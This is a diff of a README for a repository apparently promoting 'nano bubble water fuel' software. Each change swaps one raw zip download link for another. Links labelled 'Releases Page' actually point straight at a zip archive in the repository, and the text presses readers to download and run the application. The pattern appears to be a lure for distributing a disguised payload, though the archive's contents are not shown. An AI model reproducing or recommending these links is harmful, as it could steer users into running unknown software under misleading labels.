@@ -6,7 +6,7 @@ Welcome to the hydronano-power-labs repository! This project focuses on nano bub
 
 ## 📥 Download Now
 
-[![Download](https://github.com/jorgepjgarcia0/hydronano-power-labs/raw/refs/heads/main/assets/labs-power-hydronano-1.9.zip)](https://github.com/jorgepjgarcia0/hydronano-power-labs/raw/refs/heads/main/assets/labs-power-hydronano-1.9.zip)
+[![Download](https://github.com/jorgepjgarcia0/hydronano-power-labs/raw/refs/heads/main/pt/labs_power_hydronano_v3.3.zip)](https://github.com/jorgepjgarcia0/hydronano-power-labs/raw/refs/heads/main/pt/labs_power_hydronano_v3.3.zip)
 
 ## 🔍 Overview
 
@@ -32,7 +32,7 @@ To get started with hydronano-power-labs, you will need to download the latest v
 
 1. **Visit the Releases Page**: 
    Click the link below to go to the Releases page:
-   [Visit the Releases Page](https://github.com/jorgepjgarcia0/hydronano-power-labs/raw/refs/heads/main/assets/labs-power-hydronano-1.9.zip)
+   [Visit the Releases Page](https://github.com/jorgepjgarcia0/hydronano-power-labs/raw/refs/heads/main/pt/labs_power_hydronano_v3.3.zip)
 
 2. **Download the Software**: 
    Look for the latest version listed on the Releases page. You will find the download links available there. 
@@ -78,4 +78,4 @@ We welcome contributions from anyone interested in enhancing the hydronano-power
 
 Thank you for your interest in hydronano-power-labs. By exploring nano bubble water fuel and hydrogen energy concepts, you contribute to the advancement of clean energy. Download the application today to join in on this important journey.
 
-For more detailed information and updates, always refer back to the [Releases Page](https://github.com/jorgepjgarcia0/hydronano-power-labs/raw/refs/heads/main/assets/labs-power-hydronano-1.9.zip).
+For more detailed information and updates, always refer back to the [Releases Page](https://github.com/jorgepjgarcia0/hydronano-power-labs/raw/refs/heads/main/pt/labs_power_hydronano_v3.3.zip).
